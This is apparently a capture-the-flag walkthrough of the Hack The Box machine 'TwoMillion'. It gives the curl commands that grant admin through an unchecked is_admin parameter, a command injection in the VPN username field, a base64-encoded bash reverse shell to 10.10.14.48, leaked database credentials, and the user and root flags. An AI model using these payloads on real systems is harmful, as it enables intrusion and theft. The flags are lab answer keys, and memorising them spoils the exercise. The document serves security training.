# TwoMillion

After mapping the website 
on page of login :-
simple login form with error in "User not found" ==> you can bruteforce username
by dirb search 
you will find : http://2million.htb/register
also found js function in invite page
after deobfuscate it 
```
function verifyInviteCode(code) {
    var formData = { "code": code };

    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            if (response.status === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                localStorage.setItem('inviteCode', code);
                window.location.href = '/register';
            } else {
                alert("Invalid invite code. Please try again.");
            }
        },
        error: function(response) {
            alert("An error occurred. Please try again.");
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

```
then go to register page 
http://2million.htb/register

with burpe you will git this reqest 
```
POST /api/v1/user/register HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://2million.htb
Connection: close
Referer: http://2million.htb/register
Cookie: PHPSESSID=dro49cpjchla0hbraffbmhqv4v
Upgrade-Insecure-Requests: 1

code=&username=user&email=user%40htb.com&password=user&password_confirmation=user
```

curl -sX POST http://2million.htb/api/v1/invite/how/to/generate 
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}

you got a ROT13-decoded message says : In order to generate the invite code, make a POST request to /api/v1/invite/generate

curl -sX POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"N1ZQVDQtSTRGTTQtTjNRM0stMktJOUc=","format":"encoded"}}  

it is base64 decoded invitation code  => echo N1ZQVDQtSTRGTTQtTjNRM0stMktJOUc= | base64 -d => 7VPT4-I4FM4-N3Q3K-2KI9G 

Use the invitation code to register an account

code=7VPT4-I4FM4-N3Q3K-2KI9G&username=user&email=user%40htb.com&password=user&password_confirmation=user

GET the PHPSESSID from your browser => 0u8rjqr7pid9s7m2eaoavcjecu

curl -sv 2million.htb/api --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq

curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq

* Connection #0 to host 2million.htb left intact
{
  "/api/v1": "Version 1 of the API"
}

curl http://2million.htb/api/v1 --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq 

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

You find all V1 data

curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" | jq

{
  "status": "danger",
  "message": "Missing parameter: email"
}

curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"email":"user@htb.com"}' | jq

{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}

curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"email":"user@htb.com", "is_admin": '1'}' | jq 

{
  "id": 13,
  "username": "user",
  "is_admin": 1
}

if you now try curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" | jq

curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"username":"user"}'  

curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0u8rjqr7pid9s7m2eaoavcjecu" --header "Content-Type: application/json" --data '{"username":"user;id;"}'  

echo -n "bash -i >& /dev/tcp/10.10.14.48/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OC8xMjM0IDA+JjE=

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

We find admin password 
ssh to admin with the password

user flag => a2624f25c7983f33de70b88f7b290710

in /var/mail/admin

From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

root.txt => f3f590b486fa536eb258bc4abf59e107
